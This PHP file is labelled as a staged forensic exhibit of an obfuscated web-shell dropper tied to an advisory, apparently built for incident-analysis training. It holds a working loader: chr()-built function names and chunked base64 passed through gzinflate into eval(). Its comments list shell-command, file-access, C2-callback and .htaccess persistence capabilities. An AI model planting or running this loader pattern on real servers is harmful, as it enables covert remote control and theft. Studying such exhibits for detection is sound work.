<?php
// staged exhibit — APSB25-94 public advisory reconstruction — NOT customer data
// 2-layer obfuscation typical of PolyShell variants observed post-APSB25-94:
//   outer: chr() ladder for function-name reconstruction + 4-chunk base64
//          concatenation (defeats naive `grep gzinflate` / `grep base64_decode`)
//   inner: raw DEFLATE (gzinflate over base64_decode) — yields a command-router
//          stub that dispatches on $_POST['c'] with a `BL-STAGE` key gate
// The inner payload is NON-FUNCTIONAL by design: it echoes a sentinel string for
// each dispatched key but never invokes system(), exec(), passthru(), or eval()
// against user input. Intent reconstructor (Day 4) walks both layers and reads
// the dormant-capability comments below as the "what this would do if armed"
// reference. Do NOT arm this file.
//
// Variant deltas vs host-2 + host-4 (same actor, same family, third drop):
//   - drop path: /var/www/html/pub/media/import/.tmp/a.php
//   - chunked base64 strings differ from host-2 and host-4 (per-drop polymorphism)
//   - C2 callback hostname unchanged (vagqea4wrlkdg.top) — third corroborating
//     attribution signal across hosts; case engine should now be at high
//     confidence on coordinated-campaign attribution
//
// dormant-capability markers (commented for exhibit; DO NOT execute or uncomment):
//   - cmd exec     : $_POST['c'] → system() / passthru() / popen()
//   - file r/w     : $_GET['a']  → file_get_contents() / file_put_contents()
//   - callback     : curl POST to vagqea4wrlkdg.top (same hostname as host-2,
//                    host-4; no real domain)
//   - persistence  : chmod 0644 on sibling .htaccess, AddType PHP on .jpg
$_w=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$_v=chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101);
$_c1="kzJSk7N0clMzs4uSE0sUYnNzc1KSk1NzczMzdRRyk7NTC4tT8wsyk0sLcrM";
$_c2="V9JNzkxLLkpMy81My8wpKkrNyixOzcsozUstUbJWqimvqrAryS3WLs5N1NU";
$_c3="zT8rMSdJOLM5Mzk0vSi3KSc/RyaisrCxJyc8tT9PJysxN1k0tysxLT0nKTU";
$_c4="3SyU3MzklVqkmuKKpNAQDAjxK7ZPKmjMTM5DyQjEKgAA==";
$_q=$_c1.$_c2.$_c3.$_c4;
$_p=$_v($_w($_q));   // placeholder decode — $_p resolves to a router stub that
                     // returns "BL-STAGE" sentinels; no user input ever reaches
                     // system()/eval() in this staged exhibit
eval($_p);
?>
